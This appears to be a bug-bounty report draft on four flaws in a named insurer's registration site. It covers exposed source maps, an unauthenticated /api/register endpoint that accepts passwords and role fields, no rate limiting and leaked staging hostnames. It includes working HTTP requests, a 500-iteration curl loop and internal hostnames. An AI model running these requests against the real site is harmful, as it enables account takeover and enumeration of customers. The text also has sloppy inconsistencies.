target : https://bugcrowd.com/engagements/northwestern-mutual-mbb-og
scope *.northwesternmutual.com
https://northwesternmutual.com

finding 1
Source Map Exposure - Full Source Code Reconstruction on ssr.northwesternmutual.com
https://ssr.northwesternmutual.com & https://ssr.northwesternmutual.com/static/js/main.c85b962d.chunk.js.map
The production environment exposes Webpack source map files publicly, allowing any unauthenticated user to download and reconstruct the complete original source code of the application.
Steps to Reproduce:

Visit https://ssr.northwesternmutual.com/static/js/main.c85b962d.chunk.js
Append .map to the URL: https://ssr.northwesternmutual.com/static/js/main.c85b962d.chunk.js.map
Download the file it contains the full reconstructed source tree including services/lambda.js, components/PasswordConfirmationForm.js, utils/regex.js, and components/ContentSecurityPolicy.js
Use Chrome DevTools Sources tab to browse the full project structure
Impact:
Exposes internal application logic, API endpoint structure, environment configurations, and internal domain names significantly accelerating further vulnerability discovery.
Evidence: Source map file publicly accessible. Full project tree visible in Chrome DevTools Sources tab.

and ican find a githup urls https://github.com/tc39/proposal-observable

https://gist.github.com/gaearon/e7d97cdf38a2907924ea12e4ebdf3c85
https://github.com/reduxjs/react-redux/blob/master/src/utils/useIsomorphicLayoutEffect.js

<img width="2559" height="1439" alt="image" src="https://github.com/user-attachments/assets/5cc09bc4-d078-4ca5-a572-c7191fb52e3c" />
<img width="2553" height="1328" alt="image" src="https://github.com/user-attachments/assets/f7244a9e-af22-4178-a601-42c8081c4a0a" />
https://bugcrowd.com/attachments/kyjkkvjzer mp4




finding 2 


Unauthenticated /api/register Endpoint Accepts Password Reset Without Identity Verification
https://ssr.northwesternmutual.com/api/register

The /api/register endpoint accepts POST requests containing srNum, newPassword, and confirmNewPassword without requiring any authentication token, session cookie, JWT, or authorization header. The server returns {"code":"S","message":"SUCCESS"} for any input including non-existent srNum values, indicating a blind acceptance logic flaw.
Steps to Reproduce:
POST /api/register HTTP/2
Host: ssr.northwesternmutual.com
Content-Type: application/json

{

  "email": "your-ninja@bugcrowdninja.com",

  "firstName": "test",

  "lastName": "eil",

  "srNum": "77889900",

  "roleType": "STAFF",

  "newPassword": "!",

  "confirmNewPassword": "!",

  "status": "COMPLETE",

  "captcha": ""

}
Response:
HTTP/2 200 OK
{"code":"S","message":"SUCCESS"}
Impact:
"The lack of authorization on the /api/register endpoint, combined with Mass Assignment vulnerability, allows an unauthenticated attacker to manipulate sensitive account attributes (e.g., roleType, status). This not only facilitates the creation of unauthorized administrative accounts but also enables a full Pre-Auth Account Takeover by re-registering existing srNum values with attacker-controlled credentials."
<img width="2560" height="1440" alt="image" src="https://github.com/user-attachments/assets/f17b675a-2369-446d-a90a-de923a2c0fd7" />

And if the hacker can reach the srNum of a real customer at that time, he will be able to change the password and reach ATO and also even throughGET /api/status? srNum=77889922

He can reach information about his account
Since there is no rate limit, he can create a lot off fake users or update users acc



finding 3


No Rate Limiting on /api/register Endpoint
https://ssr.northwesternmutual.com/api/register'


Server Security Misconfiguration > No Rate Limiting on Form > Registration
Description:
The /api/register endpoint has no rate limiting or throttling mechanism. Sending hundreds of consecutive requests returns HTTP 200 with no 429 response, no CAPTCHA challenge, and no request slowdown.
Steps to Reproduce:
bashfor i in {1..500}; do
curl -s -o /dev/null -w "%{http_code}\n" -X POST \
"https://ssr.iamp.apps.northwesternmutual.com/api/register" \
-H "Content-Type: application/json" \
-d '{"status":true,"email":"test@bugcrowdninja.com","srNum":"11111111","newPassword":"Test123!","confirmNewPassword":"Test123!"}'
done
Result: All 50 requests return 200 with no throttling.
Impact:
Combined with the unauthenticated endpoint, the absence of rate limiting makes automated enumeration of srNum values trivially possible.


finding 4
The file static/js/components/ContentSecurityPolicy.js (accessible via the exposed source maps) contains hardcoded references to internal non-production environments.
Vulnerable Code:
javascriptcase 'int':
return https://ssrint.iampnon.apps.northwesternmutual.com
https://ssrtest.northwesternmutual.com;
case 'qa':
return https://ssrqa.iampnon.apps.northwesternmutual.com
https://ssrstage.northwesternmutual.com;
Exposed Domains:

ssrint.iampnon.apps.northwesternmutual.com
ssrtest.northwesternmutual.com
ssrqa.iampnon.apps.northwesternmutual.com
ssrstage.northwesternmutual.com
https://ssr.northwesternmutual.com/staffRegistrationEmail.do

Impact:
Provides attackers with internal infrastructure hostnames that can be used to pivot attacks toward staging environments which typically have weaker security controls.



